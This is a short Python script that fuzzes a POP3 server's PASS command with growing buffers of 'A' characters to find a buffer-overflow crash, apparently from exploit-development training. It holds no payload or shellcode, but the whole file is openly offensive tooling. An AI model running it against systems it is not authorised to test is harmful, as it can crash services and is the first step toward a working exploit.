#!/usr/bin/python

import socket
import sys
import time

try:
    server = sys.argv[1]
    port = 110
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()



for i in range(100, 10000, 100):
	buffer = "A" * i
	
	print("\nPass: " + str(i))
	#print((server, port))

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print ("\nSending evil buffer...")
		s.connect((server, port))
		data = s.recv(1024)
		print(data)
		s.send("USER username" + "\r\n")
		data = s.recv(1024)
		print(data)
		s.send("PASS " + buffer + "\r\n")
		data = s.recv(1024)
		print(data)
		print("\nDone!.")
		s.close()
	except KeyboardInterrupt:
		s.close()
		sys.exit()
	except Exception as ex:
		print ("Could not connect to POP3!", ex)

